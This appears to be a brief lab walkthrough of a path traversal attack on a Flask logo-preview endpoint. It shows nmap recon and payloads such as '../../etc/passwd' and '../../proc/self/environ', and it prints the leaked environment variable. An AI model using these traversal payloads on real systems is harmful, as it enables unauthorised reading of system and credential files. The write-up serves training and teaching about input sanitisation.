# Path Traversal — Detailed Walkthrough

## Target
10.0.30.19

## Objective
Exploit logo preview functionality to retrieve /proc/self/environ and extract MEMORY_PRESSURE_WATCH.

## Recon
nmap --top-ports 1000 10.0.30.19
Open ports:
22/tcp (SSH)
80/tcp (HTTP)

Service:
Werkzeug httpd (Python 3.12.3)

## Vulnerable Endpoint
/admin/logo_preview?file=logo.png

## Exploitation

Test traversal:
file=../../etc/passwd

Result:
Successfully retrieved /etc/passwd contents.

Target file:
file=../../proc/self/environ

Result:
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/flaskapp.service/memory.pressure

## Conclusion
The application fails to sanitize file path input.
Relative path traversal allowed arbitrary file read.
